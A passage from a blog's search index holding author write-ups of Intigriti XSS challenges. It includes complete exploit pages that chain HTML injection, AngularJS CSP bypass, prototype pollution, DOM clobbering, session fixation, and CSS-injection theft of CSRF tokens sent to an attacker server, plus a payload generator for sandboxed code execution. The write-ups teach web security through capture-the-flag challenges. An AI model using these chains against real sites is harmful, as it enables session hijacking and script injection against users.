solution unnecessary and redundant. It’s like there should be five steps for solving the challenge, but you can solve it in step2 because of the bugs. The challenge should be more complex and interesting. So, here comes the revenge of Intigriti 0422 challenge! I patched the bugs and hosted the fixed challenge on GitHub, here is the challenge URL: https://aszx87410.github.io/xss-challenge/revenge-of-intigriti-0422 You can found the diff below: function sanitize(data) &#123; - if (typeof data !== 'string') return data + if (typeof data !== 'string') data = String(data) function merge(target, source) &#123; - let protectedKeys = ['__proto__', \"mode\", \"version\", \"location\", \"src\", \"data\", \"m\"] + let protectedKeys = ['__proto__', \"mode\", \"version\", \"location\", \"src\", \"data\", \"m\", \"Object\"] The revenge of Intigriti 0422 challenge runs until 2022-05-01T23:59:59+00:00, you can DM me on Twitter if you find the solution. Please noted that the revenge of Intigriti 0422 challenge is a challenge hosted by my own, not Intigriti, so there is no swag voucher for the winners.","link":"/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/"},{"title":"Intigriti 0822 XSS Challenge Author Writeup","text":"In Auguest, I and bruno made a XSS challenge on Intigriti. When we decided to make it, we hope it’s a difficult and fun challenge, and the players can also learn a lot from it. Here is the writeup for this challenge. About the challengehttps://challenge-0822.intigriti.io/ The challenge is a business card generator with following features: Update theme Preview name &amp; description Update name The goal of the challenge is to pop up an alert. User interaction is allowed in a very limited sense. For example, you give the admin a page, the admin will click the “CLICK ME” button on that page, that’s all. SolutionBasically, there are two parts of the challenge: CSRF bypass CSP to perform XSS The second part is easier to understand, so I will start from the second part. XSSIn preview.php, there is a feature to replace the link to either iframe or image after sanitized: $name = htmlspecialchars($name); $desc = htmlspecialchars($desc); $desc = preg_replace('/(https?:\\/\\/www\\.youtube\\.com\\/embed\\/[^\\s]*)/', '&lt;iframe src=\"$1\">&lt;/iframe>', $desc); $desc = preg_replace('/(https?:\\/\\/[^\\s]*\\.(png|jpg|gif))/', '&lt;img src=\"$1\">', $desc); It looks fine at first glance, because we already sanitized the content, so you can’t escape from the double quote. But, if you think outside the box, you will found that it’s not true. What if a link gets transform to both iframe and img at the same time? Take https://www.youtube.com/embed/abc.jpg as an example, after first replacement, it become: &lt;iframe src=\"https://www.youtube.com/embed/abc.jpg\">&lt;/iframe> After the second replacement, the src part become &lt;img src=\"https://www.youtube.com/embed/abc.jpg\"> So the entire string is: &lt;iframe src=\"&lt;img src=\"https://www.youtube.com/embed/abc.jpg\">\">&lt;/iframe> Because of this behavior, the double quote of the src attribute has been closed, which means we can inject a new attribute to iframe. For example, we can inject srcdoc using this link: https://www.youtube.com/embed/srcdoc=&lt;h1&gt;hello&lt;/h1&gt;.jpg You may wondering why this works, how can it bypass the htmlspecialchars? No, it’s not. The content is still encoded, but the context is different. It’s the content of the attribute now. In HTML, the attribute content will be decoded. For now, we can inject any HTML we want via &lt;iframe srcdoc&gt;, but it’s not an XSS at the moment as we still need to bypass the CSP. CSP BypassHere is the CSP: &lt;?php header(\"Content-Security-Policy: \". \"default-src 'self'; \" . \"img-src http: https:; \" . \"style-src 'unsafe-inline' http: https:; \" . \"object-src 'none';\" . \"base-uri 'none';\" . \"font-src http: https:;\". \"frame-src https://www.youtube.com/;\". \"script-src 'self' https://cdnjs.cloudflare.com/ajax/libs/;\"); ?> It’s a classic CSP bypass which even appeared in the intigriti XSS challenge last month. https://cdnjs.cloudflare.com/ajax/libs is allowed, so we can use the Angular gadget in the XSS cheat sheet: &lt;input id=x ng-focus=$event.path|orderBy:'(z=alert)(1)'> Are we done? Nope, it’s not work because focus event is not triggered. The preivew content is hidden by default, the user needs to click the button to remove display:none CSS rule to make it visible. It’s a dead end since user interaction is not allowed here. When it comes to Angular CSP bypass, my favorite one is the following: &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;$on.curry.call().alert(1)&#125;&#125; &lt;/div> User interaction is not needed, as well as unsafe-inline and unsafe-eval. I learned this payload from: Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup H5SC Minichallenge 3: “Sh*t, it’s CSP!” It seems great, but the payload still won’t work because of a keyword-based block list: $dangerous_words = ['eval', 'setTimeout', 'setInterval', 'Function', 'constructor', 'proto', 'on', '%', '&amp;', '#', '?', '\\\\']; foreach ($dangerous_words as $word) &#123; if (stripos($desc, $word) !== false)&#123; header(\"Location: app.php#msg=dangerous word detected!\"); die(); &#125; &#125; proto is forbidden, also # and &amp;, so we can’t use HTML entities to bypass the detection. To solve this problem, the player is expected to find out that why prototype.js is needed for the bypass. It’s needed because prototype.js adds a few methods to different prototype, like Function.prototype: function curry() &#123; if (!arguments.length) return this; var __method = this, args = slice.call(arguments, 0); return function() &#123; var a = merge(args, arguments); return __method.apply(this, a); &#125; &#125; The first argument of Function.prototype.call is thisArg, you can decide the value of this in the function. It’s worth noting that if you call this function without providing thisArg, the default value of this will be window in non-strict mode. Here is an example: function test()&#123; console.log(this) &#125; test.call(123) // 123 test.call('str') // 'str' test.call() // window So, any_function.curry.call() will return this because of this line: if (!arguments.length) return this. And we call this function without providing thisArg, so this is window now. This behavior bypasses the Angular sandbox, that’s why we need prototype.js. If we can find a similar library that also pollutes the prototype and return this, we can replace prototype.js. How to find such library? Have you heard about SmooshGate? If you don’t, you can read this great article: SmooshGate FAQ. It’s a story about Array.prototype.flat, which should be named as Array.prototype.flatten at first. Why Array.prototype.flatten is abandoned? It’s because a library called MooTools already used this name for quite a while. If the browsers implement Array.prototype.flatten, all websited that used MooTools will break. From the story, we know that MooTools is another library which will pollute the prototype in some way. How to find what is polluted? Looking at the source code? No, there is better way to do that. The idea is simple, we can enumerate all methods on the prototype first, then load the library, enumerate again to see if there are anything added. It’s not hard to implement such idea: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function getPrototypeFunctions(prototype) &#123; return Object.getOwnPropertyNames(prototype) &#125; var protos = &#123; array: getPrototypeFunctions(Array.prototype), string: getPrototypeFunctions(String.prototype), number: getPrototypeFunctions(Number.prototype), object: getPrototypeFunctions(Object.prototype), function: getPrototypeFunctions(Function.prototype) &#125; &lt;/script> &lt;/head> &lt;body> &lt;!-- insert script here --> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\">&lt;/script> &lt;!-- insert script here --> &lt;script> var newProtos = &#123; array: getPrototypeFunctions(Array.prototype), string: getPrototypeFunctions(String.prototype), number: getPrototypeFunctions(Number.prototype), object: getPrototypeFunctions(Object.prototype), function: getPrototypeFunctions(Function.prototype) &#125; let result = &#123; prototypeFunctions: [], functionsReturnWindow: [] &#125; function check() &#123; checkPrototype('array', 'Array.prototype', Array.prototype) checkPrototype('string', 'String.prototype', String.prototype) checkPrototype('number', 'Number.prototype', Number.prototype) checkPrototype('object', 'Object.prototype', Object.prototype) checkPrototype('function', 'Function.prototype', Function.prototype) return result &#125; function checkPrototype(name, prototypeName, prototype) &#123; const oldFuncs = protos[name] const newFuncs = newProtos[name] for(let fnName of newFuncs) &#123; if (!oldFuncs.includes(fnName)) &#123; const fullName = prototypeName + '.' + fnName result.prototypeFunctions.push(fullName) try &#123; if (prototype[fnName].call() === window) &#123; result.functionsReturnWindow.push(fullName) &#125; &#125; catch(err) &#123; &#125; &#125; &#125; &#125; console.log(check()) &lt;/script> &lt;/body> &lt;/html> The result is: So, we can replace prototype.js with MooTools: &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\">&lt;/script> &lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;/script> &lt;div ng-app ng-csp> &#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125; &lt;/div> What if the players never heard about SmoothGate? They can use the similar approach in an automatic way. cdn.js provides an API to query all hosted libraries, the player can leverage this API and the script above to build a simple tool to find all gadgets on cdn.js. I will open source a project about this within a few days. Now we have an XSS, but it still need user interaction to submit the form. In order to avoid user interaction, we need CSRF. To perform CSRF, we need to steal CSRF token. Steal CSRF tokenWhere is the CSRF token? The CSRF token is in the app.php page, it appears twice: &lt;meta name=\"csrf-token\" content=\"&lt;?= $csrf_token ?>\"> &lt;div> &lt;input type=\"hidden\" name=\"csrf-token\" value=\"&lt;?= $csrf_token ?>\" /> &lt;/div> There is another vulnerability in app.php: &lt;input id=\"nameField\" type=\"text\" name=\"name\" value=\"&lt;?= $_SESSION['name']; ?>\" maxlength=\"20\"> $_SESSION[&#39;name&#39;] is not encoded before printing, so we have a HTML injection here. But the problem is, there is another check for the length of the name: if (strlen($name) >= 20) &#123; die('name too long'); &#125; Given that the CSP is strict and the length is very limited, XSS is most likely impossible. It’s fine, because XSS is not the only way to steal something, we can use CSS injection! This is a good article to learn what CSS injection is and various way to exploit: CSS Injection Primitives. Usually, the blog post about stealing CSRF token is for &lt;input&gt;, but we have &lt;input type=hidden&gt; here, so it won’t work. if there is other sibling element, we can use sibling selector like this: input[value^=a] div to steal the token, but it’s also not working here because &lt;input&gt; is wrapped by a &lt;div&gt;. Then, how to leak the content? Since &lt;input&gt; won’t work, we can use &lt;meta&gt; tag! &lt;meta&gt; is not displayed because browser adds a default display:none attribute, we can override it by explicitly declare meta &#123; display:block; &#125;. It’s not enough, because &lt;meta&gt; is under &lt;head&gt;, and &lt;head&gt; is also hidden by default, so we need head, meta &#123; display:block; &#125; to make it visible. You may wondering: “It should be useless to make it ‘visible’, because meta content is invisible by default, you can’t see the content on the screen!” It sounds fair, but surprisingly, the style for &lt;meta&gt; still apply even you can’t see the content. By the way, there is a selector called :has, this will make this challenge much easier. But it’s enabled by default from Chrome 105 which is still in beta until the end of August(yep, two days after). If we can inject &lt;style&gt; tag, we can steal the first character of the CSRF token in the following way: &lt;style> head, meta[name=csrf-token] &#123; display: block; &#125; meta[name=csrf-token][content^=\"a\"] &#123; background: url(https://example.com?char=a); &#125; meta[name=csrf-token][content^=\"b\"] &#123; background: url(https://example.com?char=b); &#125; &lt;/style> We can steal all 32 characters by doing the same thing again and again. The implementation is a bit trivial, you can build your own or try to utilize some open-source projects on GitHub. When displaying a message, it calls DOMPurify.sanitize to filter out malicious content, but &lt;style&gt; is not consider harmful and it’s allowed by default in DOMPurify. function showMessage(message, options) &#123; const getTimeout = options.timeout || (() => 1000) const container = options.container || document.querySelector('body') const modal = document.createElement('div') modal.id = 'messageModal' modal.innerHTML = DOMPurify.sanitize(message) container.appendChild(modal) history.replaceState(null, null, ' ') setTimeout(() => &#123; container.removeChild(modal) &#125;, getTimeout()) &#125; The problem is, our injected element will be removed after so called timeout, the default timeout is Math.random()*300 + 300 as per following code: function start() &#123; const message = decodeURIComponent(location.hash.replace('#msg=', '')) if (!message.length) return const options = &#123;&#125; if (document.domain.match(/testing/)) &#123; options['production'] = false &#125; else &#123; options['production'] = true options['timeout'] = () => Math.random()*300 + 300 &#125; showMessage(message, &#123; container: document.querySelector('body'), ...options &#125;) &#125; We can’t steal a 32-characters CSRF token in 600ms, unless we find a way to increase the timeout. Look at the following part carefully: if (document.domain.match(/testing/)) &#123; options['production'] = false &#125; else &#123; options['production'] = true options['timeout'] = () => Math.random()*300 + 300 &#125; If the condition(document.domain.match(/testing/)) is false, the timeout will be set and can’t be change. If we can let the condition be true and find a prototype pollution, we can pollute Object.prototype.timeout to manipulate the timeout. Prototype pollutionRegarding prototype pollution, people usually think it only appear when parsing query string or merge the object. In fact, the problem is about the pattern obj[x][y], anywhere with such pattern can be vulnerable if you can control both x and y It’s exactly the case for initTheme: function initTheme() &#123; if (window.matchMedia &amp;&amp; window.matchMedia('(prefers-color-scheme: dark)').matches) &#123; isDarkMode = true &#125; fetch(\"theme.php\") .then((res) => res.json()) .then((serverTheme) => &#123; theme = &#123; primary: &#123;&#125;, secondary: &#123;&#125; &#125; // look carefully at the following for loop for(let themeName in serverTheme) &#123; const currentTheme = theme[themeName] const currentServerTheme = serverTheme[themeName] for(let item in currentServerTheme) &#123; currentTheme[item] = () => isDarkMode ? currentServerTheme[item].dark : currentServerTheme[item].light &#125; &#125; const themeDiv = document.querySelector('.theme-text') themeDiv.innerText = `Primary - Text: $&#123;theme?.primary?.text()&#125;, Background: $&#123;theme?.primary?.bg()&#125; Secondary - Text: $&#123;theme?.secondary?.text()&#125;, Background: $&#123;theme?.secondary?.bg()&#125; ` start() &#125;) &#125; In the loop, it assign theme[themeName] to currentTheme. Then in another inner loop, a function is assigned to currentTheme[item], which is actually theme[themeName][item]. We can pollute the prototype by providing a theme like this: &#123; \"__proto__\":&#123; \"timeout\":&#123; \"dark\":\"99999\",\"light\":\"99999\" &#125; &#125; &#125; After theme is loaded, Object.prototype.timeout became a function which always returns &quot;99999&quot;. We have made good progress by controlling the timeout, but how about the condition? How can we make document.domain.match(/testing/) true? Is that even possible? DOM clobbering to the rescueThe value of document.domain is what you thought, until DOM clobbering comes into play. Besides clobbering window properties, document properties can also be clobbered via &lt;img&gt;, &lt;form&gt;, &lt;object&gt; and &lt;embed&gt; For example, if we have &lt;img name=cookie&gt;, the value of document.cookie will be the img element instead of a string. Remember that we have a HTML injection in 20 characters? &lt;input id=\"nameField\" type=\"text\" name=\"name\" value=\"&lt;?= $_SESSION['name']; ?>\" maxlength=\"20\"> We can let name be &quot;&gt;&lt;img name=cookie&gt;, it’s 19 characters, just fits. After document.domain became a DOM element, document.domain.match will throw an error because there is no match method in DOM or in it’s prototype chain. Wait, did I say prototype chain? In JavaScript, when a given method is not found, the JS engine will keep looking one level up to check it’s prototype until the prototype is null, hence the name “prototype chain”. DOM element is also a kind of object, if Object.prototype.match is there, it will be used. Luckily, we can make it happen by leveraging the prototype pollution vulnerability: &#123; \"__proto__\":&#123; \"timeout\":&#123; \"dark\":\"99999\",\"light\":\"99999\" &#125;, \"match\":&#123; \"dark\":\"1\", \"light\":\"1\" &#125; &#125; &#125; Now, document.domain.match(/testing/) returns &quot;1&quot; which is truthy and timeout is 9999, we can finally exploit CSS injection and steal the CSRF token. Part1 is about steal CSRF token to perform CSRF, part2 is about exploit nested parser vulnerability and find a CSP bypass to perform XSS. After finished both parts, we can build our full exploit script. Full Exploit Login with the name &quot;&gt;&lt;img name=domain&gt; to do DOM clobbering Update theme to do prototype pollution Get CSRF token via CSS injection CSRF to submit the payload which leverage nested parser XSS + CSP bypass via AngularJS Pop up the alert &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"robots\" content=\"noindex\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;/head> &lt;body> &lt;button onclick=\"run()\">click me to start&lt;/button> &lt;form id=themeForm method=\"POST\" target=\"newWindow\" enctype=\"text/plain\"> &lt;input name='&#123;\"__proto__\":&#123;\"timeout\":&#123;\"dark\":\"99999\",\"light\":\"99999\"&#125;,\"match\":&#123;\"drak\":\"1\",\"light\":\"1\"&#125;&#125;,\"primary\":&#123;\"text\":&#123;\"dark\":\"#fff\",\"light\":\"#fff\"&#125;,\"bg\":&#123;\"dark\":\"#fff\",\"light\":\"#fff\"&#125;&#125;,\"secondary\":&#123;\"text\":&#123;\"dark\":\"#fff\",\"light\":\"#fff\"&#125;,\"bg\":&#123;\"dark\":\"#fff\",\"light\":\"#fff\",\"padding\":\"' value='\"&#125;&#125;&#125;'> &lt;/form> &lt;form id=previewForm method=\"POST\" target=\"newWindow\"> &lt;input name=\"csrf-token\" value=\"\"> &lt;input name=\"desc\" value=\"\"> &lt;input name=\"name\" value=\"XSS\"> &lt;/form> &lt;script> const baseUrl = 'https://challenge-0822.intigriti.io/challenge' // you need to prepare a server to steal csrf token const cssInjectionServerUrl = 'http://localhost:5100' let win function run() &#123; // Step1. login // Step2. DOM clobbering `document.domain` let payload = '\">&lt;img name=domain>' win = window.open(baseUrl + '/login.php?name=' + encodeURIComponent(payload), 'newWindow') waitForWindowLoaded() &#125; function waitForWindowLoaded() &#123; try &#123; // if we can access win.origin, it means that the location haven't changed win.origin setTimeout(() => waitForWindowLoaded(win), 200) &#125; catch(err) &#123; // window loaded // Step3. update theme to do prototype pollution themeForm.action = baseUrl + '/theme.php' themeForm.submit() setTimeout(getCsrfToken, 1000) &#125; &#125; function getCsrfToken() &#123; // Step4: Get CSRF token via CSS injection const id = Math.random() fetch(cssInjectionServerUrl + '/result?id='+id) .then(res => res.text()) .then(res => &#123; doXSS(res) &#125;) const cssInjectionPayload = `Please wait for a few seconds &lt;style> @import url('$&#123;cssInjectionServerUrl&#125;/start?id=$&#123;id&#125;&amp;len=32') &lt;/style>` win.location = baseUrl + '/app.php#msg=' + encodeURIComponent(cssInjectionPayload) &#125; function doXSS(csrfToken) &#123; // Step5: Nested Parser XSS + CSP bypass via AngularJS let xssPayload = `https://www.youtube.com/embed/srcdoc=&lt;script/src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\">&lt;\\/script>&lt;script/src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;\\/script>&lt;div/ng-app/ng-csp>&#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125;&lt;/div>.png ` document.querySelector('#previewForm input[name=desc]').setAttribute('value', xssPayload) document.querySelector('#previewForm input[name=csrf-token]').setAttribute('value', csrfToken) previewForm.action = baseUrl + '/preview.php' previewForm.submit() &#125; &lt;/script> &lt;/body> &lt;/html> Here is a working PoC: https://randomstuffhuli.s3.amazonaws.com/0822-intigriti/exploit-intigriti.html But the css injection server is a bit buggy, and I have no plan to maintain it, so I will shutdown the server in a week. BonusBesides stealing CSRF token, there is another tricky and a bit cheated way to do CSRF without stealing it. Since we have control over other sub domains, for example, challenge-0422.intigriti.io, we can use session fixation to fix session id and CSRF token. Get a session id and CSRF token from server, assumed it’s sid123 and token123 Run document.cookie=&quot;PHPSESSID=sid123;Domain=intigriti.io;Max-Age=10;Secure&quot;; in subdomain Do CSRF with CSRF token: token123 PoC: &lt;!DOCTYPE html> &lt;html lang=\"en\"> &lt;head> &lt;meta charset=\"utf-8\"> &lt;meta name=\"robots\" content=\"noindex\"> &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"> &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"> &lt;/head> &lt;body> &lt;button onclick=\"run()\">click me to start&lt;/button> &lt;form id=previewForm method=\"POST\" target=\"abc\"> &lt;input name=\"csrf-token\" value=\"\"> &lt;input name=\"desc\" value=\"\"> &lt;input name=\"name\" value=\"XSS\"> &lt;/form> &lt;script> const baseUrl = 'https://challenge-0822.intigriti.io/challenge' // get a pair of seesion id and csrf token first const sid = '8341g3mkhlpojfup4k6keu3uls' const token = '2d414a262b5b02643a364a23a5f67dd7' function run() &#123; window.open(`https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&amp;first=1#%0adocument.cookie='PHPSESSID=$&#123;sid&#125;;Domain=intigriti.io;Max-Age=10;Secure;'`, 'abc') setTimeout(() => &#123; doXSS(token) &#125;, 2000) &#125; function doXSS(csrfToken) &#123; let xssPayload = `https://www.youtube.com/embed/srcdoc=&lt;script/src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\">&lt;\\/script>&lt;script/src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\">&lt;\\/script>&lt;div/ng-app/ng-csp>&#123;&#123;[].empty.call().alert([].empty.call().document.domain)&#125;&#125;&lt;/div>.png ` document.querySelector('#previewForm input[name=desc]').setAttribute('value', xssPayload) document.querySelector('#previewForm input[name=csrf-token]').setAttribute('value', csrfToken) previewForm.action = baseUrl + '/preview.php' previewForm.submit() &#125; &lt;/script> &lt;/body> &lt;/html> I came up with this solution after the challenge started, and it shows how a sub-domain XSS can be abused to affect other sub-domain. Another bypass with AngularJS only@kinugawamasato found another very coll way for the CSP bypass without any other library, here is the payload: https:&#x2F;&#x2F;www.youtube.com&#x2F;embed&#x2F;srcdoc&#x3D; &lt;script&#x2F;src&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.0.1&#x2F;angular.js&gt;&lt;&#x2F;script&gt; &lt;iframe&#x2F;ng-app&#x2F;ng-csp&#x2F;srcdoc&#x3D;&quot; &lt;script&#x2F;src&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;angular.js&#x2F;1.8.0&#x2F;angular.js&gt; &lt;&#x2F;script&gt; &lt;img&#x2F;ng-app&#x2F;ng-csp&#x2F;src&#x2F;ng-o&#123;&#123;&#125;&#125;n-error&#x3D;$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)&gt;&quot; &gt;&lt;&#x2F;iframe&gt;.jpg It uses nested AngularJS expression to bypass on keyword, and also use $event.target.ownerDocument.defaultView to access window, brilliant! CreditsBruno and I designed, created and implemented the challenge together. However, we still standing on the shoulders of giants. We learned a lot from other brilliant people and try to integrated some of their idea to our challenge. Kudos to @Psych0tr1a for his nested parser XSS research: Fuzzing for XSS via nested parsers condition Kudos to @Strellic_ for his idea of chaining DOM clobbering and prototype pollution and share the writeup: UNI CTF 2021: A Complex Web Exploit Chain &amp; a 0day to Bypass an Impossible CSP Kudos to @tehjh for his amazing CSP bypass via Angular We hope you like the challenge and learn a lot of new things, see you next time!","link":"/2022/08/29/en/intigriti-0822-xss-author-writeup/"},{"title":"Math jail - Intigriti 0823 XSS Challenge Author Writeup","text":"In the monthly challenges at Intigriti, I presented an XSS challenge that I named “Math Jail.” You can find the challenge at the following link: https://challenge-0823.intigriti.io/ Now that the challenge has concluded, I’d like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed. The concept of “Math jail” originated from a challenge called “Culinary Class Room” in the Hack.lu CTF 2022. This challenge required adding numerous decorators to a Python class without any parameters, with the objective of executing arbitrary code. Decorators are essentially function calls, which means you can only use code in the form of a(b(c(d(e(f()))))). How can one achieve the ability to execute any desired functionality? Similar challenges have also appeared in Chinese CTF competitions, such as the one mentioned in this article: PHP Parameterless RCE. The solution to the Culinary Class Room challenge involved finding a list, pushing multiple numbers into it, converting it to bytes, and then passing it to eval() for execution. For example, the following code snippet would push the number 112 into copyright._Printer__filenames: @copyright._Printer__filenames.append @memoryview.__basicsize__.__sub__ @staticmethod.__basicsize__.__mul__ @object.__instancecheck__ class a:pass Upon encountering this challenge, I wondered if it would be possible to create a JavaScript version. That’s how Math jail came into existence. Initially, there was no requirement for it to start with Math., but later on, I found it more interesting to do so. Moreover, if it didn’t have this restriction, one could simply execute alert(document.domain.toString()) and be done. Filtering out many keywords and potential unintended consequences would be necessary. Now, let’s discuss the general approach to solving Math jail. The overall concept of the solutionThe concept is similar to the Python version mentioned earlier. We need to find a list, push elements into it, and then join the elements and pass them to eval() for execution. Here’s a general example: var arr = [] eval(arr.join(''.toString(arr.push('a'.toString())))) // Uncaught ReferenceError: a is not defined In the above code, the variable a is executed. By following this concept, we can construct alert(). Let’s take a simple example: var arr = ['a','l','e','r'] eval( arr.join( ''.toString( arr.push( ')'.toString( arr.push( '('.toString( arr.push('t'.toString()) ) ) ) ) ) ) ) Since each function call cannot have parameters, expressions like arr.join(&#39;&#39;) can be modified to arr.join(&#39;&#39;.toString()) to comply with the rule. Once we have this basic concept, the remaining questions can be divided into four parts: How do we find a usable array? How do we find the desired characters? How do we join them? How do we execute without using eval? 1. Finding an arrayIn the given challenge, there is a specific array called Math.seeds. By using the pop() method multiple times, we can empty the array. Here’s an example: Math.seeds = [1,2,3,4] Math.seeds.pop(Math.seeds.pop(Math.seeds.pop(Math.seeds.pop()))) console.log(Math.seeds) // [] This way, we have an empty array Math.seeds that we can use to store elements. 2. Finding the desired charactersFirstly, we can check if the desired characters exist within Math. For example, Math.abs.name gives us the string &quot;abs&quot;, and by using .at() on it, Math.abs.name.at() would be &quot;a&quot;. Therefore, Math.seeds.push(Math.abs.name.at()) would make the contents of Math.seeds become [&quot;a&quot;]. The return value of Array.prototype.push is the length of the array. Hence, if we can find a function whose second letter is &#39;l&#39;, it would be optimal to reduce the number of function calls. By now, you might have realized that manually solving this challenge would be tiresome. Automating the process would be a better approach. So, let’s write a function! We can use recursion to explore each property of accessible objects and check if it meets our desired criteria. The function implementation is as follows: function findTargetFromScope(scope, matchFn, initPath='') &#123; let visited = new Set() let result = [] findTarget(scope, initPath) // return the shortest one return result.sort((a, b) => a.length - b.length)[0] function findTarget(obj, path) &#123; if(visited.has(obj)) return visited.add(obj) const list = Object.getOwnPropertyNames(obj) for(let key of list) &#123; const item = obj[key] const newPath = path ? path + \".\" + key : key try &#123; if (matchFn(item)) &#123; result.push(newPath) continue &#125; &#125; catch(err)&#123;&#125; if (item &amp;&amp; typeof item === 'object') &#123; findTarget(item, newPath) &#125; &#125; &#125; &#125; You can use the function as follows: console.log(findTargetFromScope(Math, item => item.name.at(0) === 'a','Math')) // Math.abs console.log(findTargetFromScope(Math, item => item.name.at(1) === 'l','Math')) // Math.clz32 We can also improve the usability by organizing it as follows: const findMathName = (index, char) => findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') console.log(findMathName(0, 'a')) // Math.abs console.log(findMathName(1, 'l')) // Math.clz32 Earlier, we mentioned that we would first try to find the desired character by using the array’s length. But what if we can’t find it? In that case, we can try another approach: finding it at a fixed index. For example, Math.LN2 is 0.69, and when we pass a decimal number as an argument to Array.prototype.at(), it automatically rounds down to the nearest integer. So, it becomes 0. Suppose the original return value of arr.push() is 2. By wrapping it with Math.LN2.valueOf(arr.push()), we can convert the number back to 0, allowing us to use the first character to find the desired function name. Here’s an example: Math.seeds = [] Math.seeds.push(Math.log.name.at(Math.LN2.valueOf(Math.seeds.push(Math.abs.name.at())))) This code will make the contents of the array become [&#39;a&#39;, &#39;l&#39;]. Following this approach, we can prepare a few more indices. I have prepared four: const mapping = [ ['Math.LN2.valueOf'], // 0 ['Math.LOG2E.valueOf'], // 1 ['Math.E.valueOf'], // 2 ['Math.PI.valueOf'], // 3 ] At this point, we should be able to find all the English letters we need. But what about symbols like ()? How do we handle those? This is where we can recall the handy function String.fromCharCode(). It can convert a number into a corresponding character string. To access String from Math, we can simply find any string and access its constructor, like Math.abs.name.constructor.fromCharCode. Now, the question becomes, how do we generate numbers? Since we are already using Math, let’s write a searching function that tries various combinations of Math functions! function findTargetNumber(init, target) &#123; let queue = [[[], init]] let visited = new Set() return bfs(target) function bfs(target) &#123; while(queue.length) &#123; let [path, current] = queue.shift() for(let key of Object.getOwnPropertyNames(Math))&#123; if (typeof Math[key] !== 'function') continue let value = Math[key]?.(current) if (value &amp;&amp; !Number.isNaN(value)) &#123; let newPath = [`Math.$&#123;key&#125;`, ...path] if (value === target) &#123; return newPath &#125; if (newPath.length >= 10) return if (!visited.has(value)) &#123; visited.add(value) queue.push([newPath, value]) &#125; &#125; &#125; &#125; &#125; &#125; console.log(findTargetNumber(5, '('.charCodeAt(0))) // ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32'] When we construct alert, the return value of the last push operation will be 5. Since the ASCII code for ( is 40, we can obtain 40 with the following expression: Math.floor(Math.log2(Math.cosh(Math.clz32(5)))). By concatenating it with the previous code, we can obtain (: Math.abs.name.constructor.fromCharCode(Math.floor(Math.log2(Math.cosh(Math.clz32(5))))) Putting it all together, we can form an array with the desired characters. 3. How to join the array?To join the array elements together, we need to find an empty string to transform the array into the desired string format. Initially, my idea was to generate a whitespace character and use &quot; &quot;.trim(). However, this approach would involve function calls like fn().trim(), which violates the rules specified in the challenge. Fortunately, there is another way to invoke functions: String.prototype.trim.call(&quot; &quot;). This method allows us to obtain an empty string. We can utilize the method we used earlier to find ( to find the whitespace character. Finally, we can add this sequence of function calls to achieve the desired result. Here’s an example: // Assumed we already had the array var arr = ['a','l','e','r','t','(',')'] console.log( arr.join(Math.abs.name.constructor.prototype.trim.call(Math.abs.name.constructor.fromCharCode(32))) ) // alert() 4. How to execute without using eval?Besides eval, we can also use the function constructor, like this: Function('alert()')() For the Function part, we can simply find any function and access its constructor: Math.abs.constructor('alert()')() But what about the final ()? Similarly, we can invoke a function in another way. For example, alert.call() can be written as Function.prototype.call.call(alert). Therefore, the code we need is as follows: Math.abs.constructor.call.call(Math.abs.constructor('alert()')) 5. Putting it all togetherI have written a simple script to generate the code. Here is the complete code: function findTargetFromScope(scope, matchFn, initPath='') &#123; let visited = new Set() let result = [] findTarget(scope, initPath) // return the shortest one return result.sort((a, b) => a.length - b.length)[0] function findTarget(obj, path) &#123; if(visited.has(obj)) return visited.add(obj) const list = Object.getOwnPropertyNames(obj) for(let key of list) &#123; const item = obj[key] const newPath = path ? path + \".\" + key : key try &#123; if (matchFn(item)) &#123; result.push(newPath) continue &#125; &#125; catch(err)&#123;&#125; if (item &amp;&amp; typeof item === 'object') &#123; findTarget(item, newPath) &#125; &#125; &#125; &#125; function findTargetNumber(init, target) &#123; let queue = [[[], init]] let visited = new Set() return bfs(target) function bfs(target) &#123; while(queue.length) &#123; let [path, current] = queue.shift() for(let key of Object.getOwnPropertyNames(Math))&#123; if (typeof Math[key] !== 'function') continue let value = Math[key]?.(current) if (value &amp;&amp; !Number.isNaN(value)) &#123; let newPath = [`Math.$&#123;key&#125;`, ...path] if (value === target) &#123; return newPath &#125; if (newPath.length >= 10) return if (!visited.has(value)) &#123; visited.add(value) queue.push([newPath, value]) &#125; &#125; &#125; &#125; &#125; &#125; function buildExploit(arrName, content) &#123; let ans = 